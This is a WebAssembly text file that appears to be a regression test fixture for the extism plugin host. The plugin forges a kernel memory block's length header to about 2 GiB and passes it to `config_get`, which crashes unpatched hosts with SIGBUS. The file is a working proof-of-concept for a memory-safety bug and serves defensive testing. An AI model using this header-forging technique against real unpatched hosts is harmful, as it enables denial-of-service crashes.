;; A router plugin that asks extism's own `config_get` for the config key in a block whose header it forged to about
;; 2 GiB. An unpatched extism reads the key by that length and the process dies with SIGBUS. Patched (vendor/extism),
;; `config_get` fails, which traps the call: the request is answered as a failed plugin. See echo.wat for the kernel
;; ABI.
(module
  (import "extism:host/env" "alloc" (func $alloc (param i64) (result i64)))
  (import "extism:host/env" "store_u8" (func $store_u8 (param i64 i32)))
  (import "extism:host/env" "output_set" (func $output_set (param i64 i64)))
  (import "extism:host/env" "config_get" (func $config_get (param i64) (result i64)))

  (memory 1)
  (data (i32.const 0) "\"config-get-forge\"")  ;; name: 18 bytes
  (data (i32.const 48) "\"0.1.0\"")  ;; version: 7 bytes
  (data (i32.const 80) "[\"Router\"]")  ;; supported_type: 10 bytes

  ;; copy `len` bytes at `ptr` into a new kernel block and make it the output
  (func $output_bytes (param $ptr i32) (param $len i32)
    (local $block i64)
    (local $i i32)
    (local.set $block (call $alloc (i64.extend_i32_u (local.get $len))))
    (block $done
      (loop $copy
        (br_if $done (i32.ge_u (local.get $i) (local.get $len)))
        (call $store_u8
          (i64.add (local.get $block) (i64.extend_i32_u (local.get $i)))
          (i32.load8_u (i32.add (local.get $ptr) (local.get $i))))
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br $copy)))
    (call $output_set (local.get $block) (i64.extend_i32_u (local.get $len))))

  (func (export "name") (result i32)
    (call $output_bytes (i32.const 0) (i32.const 18))
    (i32.const 0))
  (func (export "version") (result i32)
    (call $output_bytes (i32.const 48) (i32.const 7))
    (i32.const 0))
  (func (export "supported_type") (result i32)
    (call $output_bytes (i32.const 80) (i32.const 10))
    (i32.const 0))
  ;; a real 8-byte block, then the most significant byte of its `used` header field (at `$p - 1` on wasm32)
  ;; overwritten, so the kernel's `length` reports about 2 GiB (0x7f000008)
  (func $forged_block (result i64)
    (local $p i64)
    (local.set $p (call $alloc (i64.const 8)))
    (call $store_u8 (local.get $p) (i32.const 98))  ;; "b"
    (call $store_u8 (i64.sub (local.get $p) (i64.const 1)) (i32.const 0x7f))
    (local.get $p))
  (func (export "router") (result i32)
    (drop (call $config_get (call $forged_block)))
    (call $output_bytes (i32.const 0) (i32.const 2))
    (i32.const 0)))
